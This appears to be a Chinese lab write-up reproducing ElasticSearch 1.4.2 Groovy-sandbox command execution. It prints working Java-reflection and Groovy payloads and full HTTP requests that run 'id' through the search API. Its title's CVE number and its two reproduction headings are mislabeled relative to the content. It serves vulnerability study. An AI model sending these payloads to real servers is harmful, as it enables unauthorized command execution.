# ElasticSearch 命令执行漏洞（CVE-2014-3120）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包--->java代码放入json--->有回显命令执行

### 0x01漏洞介绍

​			CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。

​			jre版本：openjdk:8-jre

​			elasticsearch版本：v1.4.2

## Groovy语言“沙盒”

ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：

1. 既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射
2. Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言

所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。

Java沙盒绕过法：

```
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").getText()
```

Goovy直接执行命令法：

```
def command='id';def res=command.execute().text;res
```

### 0x02漏洞复现

**主页：**

![ElasticSearch_RCE2_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_RCE2_1.jpg)

首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "test"
}
```

![ElasticSearch_RCE2_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_RCE2_2.jpg)

**Goovy直接执行命令**

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

![ElasticSearch_RCE2_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_RCE2_3.jpg)

**Java沙盒绕过法：**

```
POST /_search?pretty HTTP/1.1
Host: 192.168.68.132:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 489

{
    "size":1,
    "script_fields": {
        "test#": {  
            "script":
                "java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream())).readLines()",

            "lang": "groovy"
        }
    }

}
```

![ElasticSearch_RCE2_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_RCE2_4.jpg)

### 0x03参考资料

https://www.cnblogs.com/qianxiao996/p/13574653.html